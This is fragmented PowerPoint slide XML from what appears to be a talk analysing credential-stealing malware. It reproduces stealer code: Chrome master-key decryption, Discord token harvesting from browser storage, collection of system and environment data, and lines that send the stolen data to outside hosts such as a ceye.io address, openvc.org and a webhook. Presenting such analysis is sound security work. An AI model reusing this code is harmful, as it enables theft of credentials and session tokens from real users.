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2" r:id="rId3"/>
    <p:sldId id="257" r:id="rId4"/>
    <p:sldId id="259" r:id="rId5"/>
    <p:sldId id="260" r:id="rId6"/>
    <p:sldId id="258" r:id="rId7"/>
    <p:sldId id="273" r:id="rId8"/>
    <p:sldId id="261" r:id="rId9"/>
    <p:sldId id="262" r:id="rId10"/>
    <p:sldId id="275" r:id="rId11"/>
    <p:sldId id="264" r:id="rId12"/>
    <p:sldId id="265" r:id="rId13"/>
    <p:sldId id="267" r:id="rId14"/>
    <p:sldId id="274" r:id="rId15"/>
    <p:sldId id="268" r:id="rId16"/>
    <p:sldId id="263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7" autoAdjust="0"/>
    <p:restoredTop sz="94673"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="111" d="100"/>
          <a:sy n="111" d="100"/>
        </p:scale>
        <p:origin x="6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DDF8D-B223-44E1-B1F1-75AF14730D81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78551-828F-4D03-AAC7-E993DD1301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2564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78551-828F-4D03-AAC7-E993DD13019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515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96C61-27D1-1066-3FC0-DBF55FB1D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F22C35-195B-7CA1-2505-110C661A6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1F1D13-CBE0-EE28-CF4A-14EF0492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8D71A5-FD4C-3D3F-6701-26275AA3F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F9B72-D6D6-D907-BE89-4F27E98E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BC572-8872-A71D-341F-EA1253D6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6666AA-864D-41FD-2A90-1B543FDD0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59C34F-7FCE-A01D-C904-B5B515BD2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801EE4-5E48-B118-767E-AE7677E6F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423C9-4495-FF24-4B09-078F2DF6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27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78E69-6390-12F8-3B5B-693DFBDE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F60A02-7CE7-2314-A2F0-CD518F3ABE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851496-B892-2A8C-110B-5A4394F1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2045CD-050F-99DE-65F0-705D0A63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F0B39-DCBB-E42D-B5F8-47068BA0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11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B267D-6C39-1E82-EEAF-D396AB38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FD1C7-CB31-1115-28A1-4AD606F65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60A7D0-5202-6E19-F03E-F3891F565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2A631C-4A7C-8D47-5045-56C98DDA9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27C852-E8C7-BF32-7396-283639640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FA64A4-6F28-1411-8398-573C46DD7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628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25808F-13C8-732F-6772-B94C6F981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17ADD5-2DDB-A861-5757-363A48D90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854699-12AF-0A30-EC38-3E7CAC75A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337B293-B46F-BC01-24C3-49BE8696E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46D7DC-0BB5-7659-552C-C48107BE9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187781-9FD1-44E1-B41D-1CD63D38F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8553AB-E78B-1161-37D6-14027F8A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C23993D-1A8B-4288-7D0A-0A8813B93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076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1CBC2-EC8C-333B-78E9-68F5FE29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E535920-0D63-D387-E0D5-62F30E755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F9D1CF-5104-1D43-D3EE-E8C4894BB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1D4362D-7EEA-FAB0-F98F-6D0495A0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30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DB27CF-36C7-FFA6-6F12-0A82A794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D6A515-F171-0B7C-E1FC-82A9C1052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2087A1-6A5A-5528-132F-705FA90E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831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8422D-2FDF-7406-8D8D-7249839F3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F38E88-0A7B-D8CF-2C94-7CE9C88AC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6D489C-A5BA-4F24-5508-631B34181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025B69-0F93-6955-4439-A05E4B20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4504A-53C3-C60B-F0EE-69E57AA5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214180-701A-E731-3AB7-796305901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39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C4AB1-A890-01E5-F5FB-91015EECC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4C02AE-F1F8-972A-5162-17B3895D7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7FEFF8-ECB5-BA9A-9FC4-1C926237B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75674F-BE6B-455C-F6A3-0EE3FC74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69D9A4-8A48-6DD3-C000-452086DA9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2C48CD-4D7B-E186-98D1-22BC71929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47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1D8A9D-E42C-F11F-0E1C-150B2120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D17F5E-DCCB-AA3E-F792-5A28C16DC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D3892-C1D5-5AB5-0784-3820F20FE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9158D8-41D5-7A9B-20AD-22C07A8A3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9184DD-C8CA-F89F-7AED-D070570F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212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2C6F68E-28E1-76D9-D9CD-E464C7BEFA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1B14DB-958E-A41D-3E50-04C1F246B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632EA-D694-3CA2-3591-E5EFC996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17C27E-B7D8-A2A8-41B5-29BD4604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1A2F54-6577-BF72-358A-CF756D3D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94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2B99769-A723-A7D7-2A3D-2E0E74CC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6177DD-3928-2FD2-19EA-A2D366991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FEB9A-09A7-C8B3-CB2F-E62B6F98B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6C6E5-5B6A-49E1-990D-321723ABC272}" type="datetimeFigureOut">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:t>2025/8/22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062EE1-3D58-CEB6-3BFE-EF5BB9E5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D93D6C-6683-41E3-B337-E2EEBD6AC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0292F-EEF8-4D5F-B871-6DEDCC842F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128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.com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07B5DC-29B2-F7B1-5E6B-CEB85137BFA8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8696325" y="5429250"/>
            <a:ext cx="196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Decryption</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="文本框 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9FB56C4C-F484-065D-188C-AEF35A2E64AB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2010546" y="935704"/>
            <a:ext cx="6200581" cy="181588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def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get_master_key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(path: str):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with open(path + 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“\\Local State”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, "r", encoding="utf-8") as f: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    c =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f.read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local_state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json.loads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(c)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400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master_key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= base64.b64decode(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local_state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["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os_crypt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"]["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encrypted_key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"])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master_key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master_key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[5:]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master_key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CryptUnprotectData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master_key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, None, None, None, 0)[1]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master_key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0897C3D-A8CA-CEA9-811A-623C4DC00425}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1629970" y="935703"/>
            <a:ext cx="3802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85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E9933-7969-BA22-3007-569F776D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52E1D7-ACC8-A9ED-271B-A4B9426092F1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9619961" y="6034070"/>
            <a:ext cx="196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Stealing info</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/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6A44BF29-FCEE-C269-2CF7-74012CE0A9C7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="441533" y="281840"/>
            <a:ext cx="5571340" cy="310315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def tokens():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paths = [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os.path.join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os.getenv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"APPDATA"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".discord"/".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discordcanary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"/".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discordptb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"Local Storage", "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leveldb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   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os.path.join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os.getenv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"APPDATA"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"Opera Software", "Opera Stable"/"Opera GX Stable", "Local Storage", "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" dirty="0" err="1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leveldb</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400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),]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tokens = []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for path in paths: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    for file in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os.listdir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(path):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        for line in [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x.strip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() for x in open(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os.path.join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(path, file), errors="ignore").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readlines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() if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x.strip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()]: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for regex in [r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}",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r"mfa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\.[\w-]{84}"]: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    for token in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re.findall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(regex, line):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       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account_name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get_account_name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(token)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                        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tokens.append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account_name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, token))</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="文本框 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A4AE1842-10E9-134E-2AB0-9F7E42E92CEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6393097" y="287219"/>
            <a:ext cx="3889421" cy="182501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hostname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socket.gethostname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(),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platform.node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cwd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os.getcwd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getpass.getuser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</a:p>
          <a:p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socket.gethostbyname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(hostname),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reqip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requests.get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("https://api.ipify.org/?format=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").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#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</a:p>
          <a:p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psutil.virtual_memory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#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RAM</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="文本框 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6C227A86-A3D5-CE22-3350-815BE8001E6E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6393098" y="2430888"/>
            <a:ext cx="3889421" cy="95410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open("/proc/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uptime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"r") as f:#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runtime</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="14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uptime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f.read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().split(" ")[0].strip()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_, value in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environ.items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string += value+" “  #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env variables</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="文本框 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{194C4503-CF9C-E572-515F-02C165268171}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2155282" y="3384995"/>
            <a:ext cx="2143842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Steal Session Tokens</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="文本框 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1C5C3B71-A276-8B47-B0D2-3402ECD3A7F1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6813807" y="2118617"/>
            <a:ext cx="3048000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(b-1) Steal Basic Device Information</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="文本框 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D83C0397-AC58-7723-FF88-AC901D2A592F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6691888" y="3387719"/>
            <a:ext cx="3291840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(b-2) Steal Complex Device Information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26F4C6-B7D5-3271-85BB-080EF7EC78B4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="56503" y="281838"/>
            <a:ext cx="38502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A4952EC-F491-537B-BE33-DD4CE22531E8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6012873" y="281838"/>
            <a:ext cx="3802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096067B-25FC-B304-5DBE-193147485B15}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6012873" y="2430888"/>
            <a:ext cx="3802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16260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E153CF6-D270-50EA-78BC-233BF7A340BE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1441973" y="1043731"/>
            <a:ext cx="8940959" cy="5078313"/>
            <a:chOff x="1441973" y="1043731"/>
            <a:chExt cx="8940959" cy="5078313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C004A180-7B9E-0791-2E70-A5F88109846B}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1441973" y="1043731"/>
              <a:ext cx="608327" cy="50783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16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17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4010F8B-D500-8EE3-8C16-A12C545D7A07}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1922932" y="1085972"/>
              <a:ext cx="8460000" cy="5036071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6">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{825D7354-37EC-3E59-C3F0-676255226073}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1922932" y="1043732"/>
              <a:ext cx="8460000" cy="404261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def tokens(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ctx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):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paths = [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os.path.join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os.getenv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"APPDATA"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), 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".discord"/".</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1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discordcanary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"/".</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1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discordptb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",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"Local Storage", "</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1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leveldb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),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os.path.join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os.getenv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"LOCALAPPDATA"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), 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"Google"/"Microsoft"/"</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1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BraveSoftware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", "Chrome"/"Edge"/"Brave-Browser", "User Data", "Default", "Local Storage", "</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1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leveldb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),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os.path.join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os.getenv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"APPDATA"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), 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"Opera Software", "Opera Stable"/"Opera GX Stable", "Local Storage", "</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1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leveldb</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"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"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),]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tokens = []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for path in paths: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for file in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os.listdir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(path):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    for line in [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x.strip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() for x in open(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os.path.join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(path, file), errors="ignore").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readlines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() if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x.strip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()]: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        for regex in [r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}",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r"mfa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\.[\w-]{84}"]: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            for token in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re.findall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(regex, line):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               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account_name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 =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get_account_name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(token)</a:t>
              </a:r>
            </a:p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                        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tokens.append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account_name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, token))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50EAB21-07FC-C4E2-7D90-0A99256FEE2E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9791700" y="6353175"/>
            <a:ext cx="1962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Steal tokens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145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07BF5-A817-4E0D-B3A3-BF266DE6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C6445C9C-A5DD-292A-08D0-8CB9B9C254DE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1559533" y="2019622"/>
            <a:ext cx="8940959" cy="1754326"/>
            <a:chOff x="1559533" y="2019622"/>
            <a:chExt cx="8940959" cy="1754326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01D04CA-EF9B-E702-CD97-E3F9FC0A2693}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2040492" y="2061864"/>
              <a:ext cx="8460000" cy="171208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02ECE0B8-D31F-23B2-DE29-A5CEBDB0E08D}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="1559533" y="2019622"/>
              <a:ext cx="8925824" cy="1754326"/>
              <a:chOff x="1559533" y="2019622"/>
              <a:chExt cx="8925824" cy="1754326"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="4" name="文本框 15">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EE03C40F-69D1-C582-FD12-D87FA4A48767}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr txBox="1"/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="1559533" y="2019622"/>
                <a:ext cx="608327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dirty="0">
                    <a:solidFill>
                      <a:srgbClr val="080808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  <a:p>
                <a:pPr algn="ctr"/>
                <a:r>
                  <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                    <a:solidFill>
                      <a:srgbClr val="080808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  <a:p>
                <a:pPr algn="ctr"/>
                <a:r>
                  <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                    <a:solidFill>
                      <a:srgbClr val="080808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  <a:p>
                <a:pPr algn="ctr"/>
                <a:r>
                  <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                    <a:solidFill>
                      <a:srgbClr val="080808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  <a:p>
                <a:pPr algn="ctr"/>
                <a:r>
                  <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                    <a:solidFill>
                      <a:srgbClr val="080808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  <a:p>
                <a:pPr algn="ctr"/>
                <a:r>
                  <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                    <a:solidFill>
                      <a:srgbClr val="080808"/>
                    </a:solidFill>
                    <a:highlight>
                      <a:srgbClr val="FFFFFF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  <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="6" name="文本框 6">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FB835B1E-62FC-A7F0-85D7-B2428F843EB8}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr txBox="1"/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="2040492" y="2019623"/>
                <a:ext cx="8444865" cy="1333177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dirty="0">
                    <a:solidFill>
                      <a:srgbClr val="080808"/>
                    </a:solidFill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hostname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socket.gethostname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(),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platform.node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()</a:t>
                </a:r>
              </a:p>
              <a:p>
                <a:r>
                  <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                    <a:solidFill>
                      <a:srgbClr val="080808"/>
                    </a:solidFill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cwd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os.getcwd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()</a:t>
                </a:r>
              </a:p>
              <a:p>
                <a:r>
                  <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                    <a:solidFill>
                      <a:srgbClr val="080808"/>
                    </a:solidFill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username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getpass.getuser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() </a:t>
                </a:r>
              </a:p>
              <a:p>
                <a:r>
                  <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                    <a:solidFill>
                      <a:srgbClr val="080808"/>
                    </a:solidFill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IPAddr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socket.gethostbyname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(hostname),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reqip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requests.get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("https://api.ipify.org/?format=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json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").</a:t>
                </a:r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json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() #</a:t>
                </a:r>
                <a:r>
                  <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                    <a:solidFill>
                      <a:srgbClr val="080808"/>
                    </a:solidFill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IP</a:t>
                </a:r>
              </a:p>
              <a:p>
                <a:r>
                  <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1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psutil.virtual_memory</a:t>
                </a:r>
                <a:r>
                  <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                    <a:solidFill>
                      <a:srgbClr val="080808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() #</a:t>
                </a:r>
                <a:r>
                  <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                    <a:solidFill>
                      <a:srgbClr val="080808"/>
                    </a:solidFill>
                    <a:highlight>
                      <a:srgbClr val="C0C0C0"/>
                    </a:highlight>
                    <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                    <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                  </a:rPr>
                  <a:t>RAM</a:t>
                </a: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7468FCA9-574C-472C-E0F4-1ABE16D8BD51}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7943850" y="5915025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Stealing Mode: system info</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="52395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975B0-4BCF-3CA3-B7A1-6C79D727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F0B5A53-F364-253A-4F5D-B8027AE7FF79}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1392608" y="2179878"/>
            <a:ext cx="8940959" cy="1477328"/>
            <a:chOff x="1392608" y="2179878"/>
            <a:chExt cx="8940959" cy="1477328"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="4" name="文本框 15">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3E277329-ADA0-2294-63B6-0E70E7037971}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1392608" y="2179878"/>
              <a:ext cx="608327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pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="080808"/>
                  </a:solidFill>
                  <a:highlight>
                    <a:srgbClr val="FFFFFF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099AB2B-6F3A-9BB3-B4EF-5F6F240FFB37}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1873567" y="2222120"/>
              <a:ext cx="8460000" cy="1435086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6" name="文本框 6">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{066E50E0-8EA5-8A98-B88D-EECDB5EAE65B}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1873567" y="2179879"/>
              <a:ext cx="8444865" cy="124912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rgbClr val="0808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with open("/proc/</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="080808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uptime</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="0808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", "r") as f: #runtime</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="0808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uptime = </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                  <a:solidFill>
                    <a:srgbClr val="0808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f.read</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="0808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().split(" ")[0].strip()</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:endPara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zh-CN" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="0808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for _, value in </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                  <a:solidFill>
                    <a:srgbClr val="080808"/>
                  </a:solidFill>
                  <a:highlight>
                    <a:srgbClr val="C0C0C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environ.items</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="0808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(): #env variables</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="0808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   string += value+" "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08412560-A973-1640-749B-52F695CCD2B9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7943850" y="5915025"/>
            <a:ext cx="3181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Stealing Mode: runtime and env variables</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1949618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5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C4FCAEC0-52FF-AA09-2A9F-339294A14494}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1785777" y="2330706"/>
            <a:ext cx="6083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E2F1A1-B54B-B5A9-58F9-FE580F1F8776}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2266736" y="2372949"/>
            <a:ext cx="8460000" cy="14350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EC9E747D-3BC5-9867-22B5-DDB187C35593}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2266736" y="2330706"/>
            <a:ext cx="8444865" cy="147732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headers=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{'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Authorization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':token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'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Content-Type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':'application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'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User-Agent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':'Mozilla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/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'}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8285E02-4ED9-8434-7417-C4260A7B01B4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7943850" y="5915025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Request Header Example</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1072864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BA60D84-7168-7953-B061-23EB83ACF428}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10031268" y="6035097"/>
            <a:ext cx="1468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transmission</a:t>
            </a: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A77797F4-8B23-7E3A-D376-C74110135BF1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2010546" y="935703"/>
            <a:ext cx="6006619" cy="224676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ploads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{'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hostname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':hostname,'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cwd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cwd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,'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':username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requests.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("http://5r13v9.ceye.io", params=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ploads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vid =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user_name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+"###"+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hostname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+"###"+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os_version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+"###"+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request.urlopen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r'http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://openvc.org/Version.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',data='vid='.encode('utf-8')+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base64.b64encode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vid.encode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('utf-8')))</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="14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payload = {"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: message.author.name,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"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avatar_url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: str(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message.author.avatar_url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)}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requests.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(config['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attachment_webhook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'],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=payload)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="文本框 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
